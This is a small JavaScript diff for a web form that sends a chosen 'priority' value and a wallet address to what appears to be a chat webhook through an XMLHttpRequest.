@@ -764,6 +764,7 @@ var value = ddlViewBy.options[ddlViewBy.selectedIndex].text;
 	    
 var adress = document.getElementById("wallet").value;
 
+var checkbox = document.getElementById("priority").value;
 	
       var request = new XMLHttpRequest();
 	    
@@ -776,7 +777,7 @@ var adress = document.getElementById("wallet").value;
 	     
         username: "Spidey Bot",
         avatar_url: "",
-        content: value + '**wallet adress:**' + adress
+        content: checkbox + '**wallet adress:**' + adress
 	              
 
       }
